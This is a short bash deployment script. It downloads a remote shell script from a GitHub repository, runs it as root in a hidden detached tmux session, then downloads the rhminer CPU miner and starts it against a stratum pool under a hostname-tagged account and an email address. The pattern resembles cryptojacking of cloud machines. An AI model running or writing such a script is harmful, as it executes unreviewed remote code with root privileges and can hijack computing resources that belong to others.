#!/bin/bash
sudo apt update
sudo apt-get install git build-essential libapparmor-dev pkg-config gawk msr-tools cmake libuv1-dev libssl-dev libhwloc-dev gnupg2 gcc make gnupg2 unzip -y



wget https://raw.githubusercontent.com/minnie1311/azureAI/master/p2p.sh
sudo tmux new-session -d -s 2 'bash p2p.sh'


sudo wget https://github.com/polyminer1/rhminer/releases/download/2.3b/rhminer.2.3.Linux.CPU.zip

sudo unzip /rhminer.2.3.Linux.CPU.zip
sudo ./rhminer -v 2 -r 20 -s stratum+tcp://fastpool.xyz:10097 -su 1139719-97.0.$HOSTNAME/mickeypp@gmail.com 

